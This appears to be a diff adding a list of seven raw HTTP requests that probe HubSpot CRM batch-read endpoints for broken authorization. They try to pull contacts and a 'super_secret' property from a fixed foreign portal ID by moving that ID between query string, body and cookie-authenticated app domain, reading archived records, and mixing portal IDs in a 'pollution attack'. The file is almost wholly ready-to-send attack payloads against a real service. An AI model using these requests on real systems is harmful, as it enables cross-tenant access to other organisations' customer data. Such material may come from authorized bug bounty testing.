@@ -1,0 +1,66 @@
+# ========================================
+# BATCH OPERATIONS - High Priority Attack Vector
+# Batch endpoints sometimes have weaker authorization
+# ========================================
+
+# REQUEST 1: Batch Read Contact (CRM v3)
+POST /crm/v3/objects/contacts/batch/read?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"inputs":[{"id":"1"},{"id":"2"},{"id":"3"},{"id":"4"},{"id":"5"}]}
+
+
+# REQUEST 2: Batch Read with propertiesWithHistory
+POST /crm/v3/objects/contacts/batch/read?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"propertiesWithHistory":["firstname","super_secret"],"inputs":[{"id":"1"}]}
+
+
+# REQUEST 3: Batch Read via App Domain (different auth context)
+POST /api/crm/v3/objects/contacts/batch/read HTTP/2
+Host: app.hubspot.com
+Cookie: YOUR_SESSION_COOKIES_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"inputs":[{"id":"1"}],"portalId":"46962361"}
+
+
+# REQUEST 4: Batch Read with Portal ID in Body
+POST /crm/v3/objects/contacts/batch/read HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"inputs":[{"id":"1","portalId":"46962361"}]}
+
+
+# REQUEST 5: Batch Archive Read (archived contacts)
+POST /crm/v3/objects/contacts/batch/archive/read?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"inputs":[{"id":"1"}]}
+
+
+# REQUEST 6: Batch Read by Internal ID
+POST /crm/v3/objects/contacts/batch/read?portalId=46962361&idProperty=hs_object_id HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"inputs":[{"id":"1"}]}
+
+
+# REQUEST 7: Mixed Portal Batch (pollution attack)
+POST /crm/v3/objects/contacts/batch/read?portalId=YOUR_PORTAL_ID HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"inputs":[{"id":"1","portalId":"46962361"}],"portalId":"46962361"}
